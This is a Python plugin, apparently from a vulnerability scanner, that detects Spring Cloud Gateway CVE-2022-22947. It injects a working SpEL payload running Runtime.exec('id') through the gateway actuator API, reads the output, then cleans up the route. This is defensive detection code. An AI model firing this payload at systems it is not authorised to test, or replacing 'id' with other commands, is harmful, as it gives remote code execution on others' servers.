# coding=utf-8
from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        url = '{}://{}:{}/actuator/gateway'.format(service, ip, port)
        payload = {
            "id": "sectest",
            "filters": [{
                "name": "AddResponseHeader",
                "args": {
                    "name": "Result",
                    "value": "#{new String(T(org.springframework.util.StreamUtils)."
                             "copyToByteArray(T(java.lang.Runtime).getRuntime()."
                             "exec(new String[]{\"id\"}).getInputStream()))}"
                }
            }],
            "uri": "http://example.com"
        }

        r = await http_client(ip, port).post(url + "/routes/sectest", json=payload, timeout=10)

        if r.status_code == 201:
            await asyncio.sleep(1.0)
            await http_client(ip, port).post(url + "/refresh", json={}, timeout=10)
            await asyncio.sleep(1.0)
            r = await http_client(ip, port).get(url + "/routes/sectest", timeout=10)
            await http_client(ip, port).delete(url + "/routes/sectest", timeout=10)
            await http_client(ip, port).post(url + "/refresh", timeout=10)

            if r.text.find('uid=') > 0 and r.text.find('gid=') > 0:
                ret = {
                    'alert_group': 'Spring Cloud Gateway CVE-2022-22947',
                    'affects': '{}://{}:{}'.format(service, ip, port),
                    'details': 'Spring Cloud Gateway CVE-2022-22947\n'
                               '命令执行漏洞，参考： https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/'
                }
                return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 80, 'http', True, task_msg={})
    run_plugin_test(scan)
